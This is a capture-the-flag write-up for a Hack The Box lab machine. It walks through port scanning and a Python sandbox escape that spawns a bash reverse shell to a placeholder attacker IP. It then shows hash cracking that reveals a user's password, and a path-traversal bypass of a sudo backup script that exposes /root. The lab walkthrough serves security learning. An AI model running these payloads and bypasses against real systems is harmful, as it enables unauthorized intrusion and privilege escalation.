---
sticker: lucide//code-2
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 5000 | http    |

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack Gunicorn 20.0.4
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

We can begin by going into the web application:

![](../images/Pasted%20image%2020250324224713.png)

We got a python code execution, let's check the behavior:

![](../images/Pasted%20image%2020250324225113.png)

For example, if we try sending ourselves a reverse shell, we are unable to do it, so, let's search around, for another way to get a shell.

# EXPLOITATION
---

Knowing that there's some filter regarding keywords, we can use other payloads, for example, let's try sending the shell in another format:

```
().__class__.__base__.__subclasses__()[317](["/bin/bash","-c","ls|bash -i >& /dev/tcp/IP/PORT 0>&1"])
```

Explanation of this code would be the following:

1. **`().__class__.__base__.__subclasses__()`**
    
    - Accesses all loaded Python classes via the tuple instance's inheritance chain
        
2. **`[317]`**
    
    - Indexes to `subprocess.Popen` class (common but environment-dependent)
        
3. **`(["...bash..."])`**
    
    - Executes the bash reverse shell command via Popen


If we run the code, we can see this:

![](../images/Pasted%20image%2020250324225905.png)

We got the reverse shell, issue is that after some time, it gets closed automatically:

![](../images/Pasted%20image%2020250324230045.png)

To solve this issue, let's stabilize our shell:

1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. /usr/bin/script -qc /bin/bash /dev/null
3. CTRL + Z
4. stty raw -echo; fg
5. reset xterm
6. export TERM=xterm
7. export BASH=bash

We can read user flag right now:

```
app-production@code:~$ cat /home/app-production/user.txt
14add09d1be39e504588e452737ac72c
```

Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---

Looking around we can find a `database.db` file:

![](../images/Pasted%20image%2020250324230546.png)

Let's download it in our machine and look at the contents with `sqlitebrowser`:

![](../images/Pasted%20image%2020250324230620.png)

We got two users, but, looking at `/etc/passwd` we can see that `martin` is the user with a shell:

![](../images/Pasted%20image%2020250324230723.png)

Let's crack the md5 hash:

![](../images/Pasted%20image%2020250324230746.png)


We got martin's credentials:

```
martin:nafeelswordsmaster
```

Let's go into ssh:

![](../images/Pasted%20image%2020250324230841.png)

Let's check our sudo privileges:

![](../images/Pasted%20image%2020250324230915.png)

We can run something called `backy.sh`, let's check this file:

```
martin@code:~/backups$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```


1. **Script Logic**:
    - Sanitizes `directories_to_archive` by removing `../`
    - Restricts paths to `/var/` or `/home/`
    - Passes the sanitized JSON to `/usr/bin/backy`

2. **Critical Flaw**:  
    The script doesn't resolve symlinks when checking allowed paths. We can abuse this to archive sensitive directories like `/root`.


We can try creating a symlink for root folder:

```
ln -s /root /home/martin/backups/root_link
```

Then modify the `task.json` file:

```json
{
    "destination": "/home/martin/backups/",
    "directories_to_archive": [
        "/home/martin/backups/root_link"
    ],
    "exclude": [".*"]
}
```

We can now execute the script:

```
sudo /usr/bin/backy.sh task.json
```

If we check the folder this happens:

![](../images/Pasted%20image%2020250324233308.png)

We get a permission denied, seems like we cannot backup the whole root folder using this method, let's try doing something else, for example, we now that the script restricts the path to `/var` or `/home`, so, what if we use this and try to use `path traversal` to get the contents of the `root` folder:

```json
{
    "destination": "/home/martin/backups/",
    "directories_to_archive": [
        "/var/....//root/"
    ]
}
```

With this, we are using path traversal to backup the root folder:

```
sudo /usr/bin/backy.sh task.json
```

![](../images/Pasted%20image%2020250324234117.png)

Nice, it worked, let's check if we're able to access the contents of it:

![](../images/Pasted%20image%2020250324234139.png)

```
cat root.txt
3ad1ddf89c85abaae7bf403ea906156a
```

![](../images/Pasted%20image%2020250324234355.png)

https://www.hackthebox.com/achievement/machine/1872557/653

